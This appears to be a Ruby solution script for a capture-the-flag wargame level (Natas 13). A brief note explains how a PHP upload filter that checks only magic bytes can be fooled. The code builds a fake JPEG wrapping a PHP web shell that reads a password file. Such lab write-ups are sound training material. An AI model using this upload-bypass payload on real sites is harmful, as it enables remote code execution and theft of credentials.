=begin
19 July, 2017
The application allows file uploads, but validates the file type with the exif_imagetype PHP function.
Since this function checks the "Magic number" bytes at the beginning of the file, we can trick it into thinking
that we are uploading a JPEG image. Code execution then allows us to retrieve the password from /etc/natas_webpass/natas14
=end

# The magic numbers for JPEG
magic1 = "\xff\xd8\xff"
magic2 = "\xff\xd9"
# Our shell to get the password.
php = "<? echo(`cat /etc/natas_webpass/natas14`); ?>"

puts "Creating file."
f = File.new("natas13.php", "w")
f.write(magic1)
f.write(php)
f.write(magic2)
f.close
puts "Done."
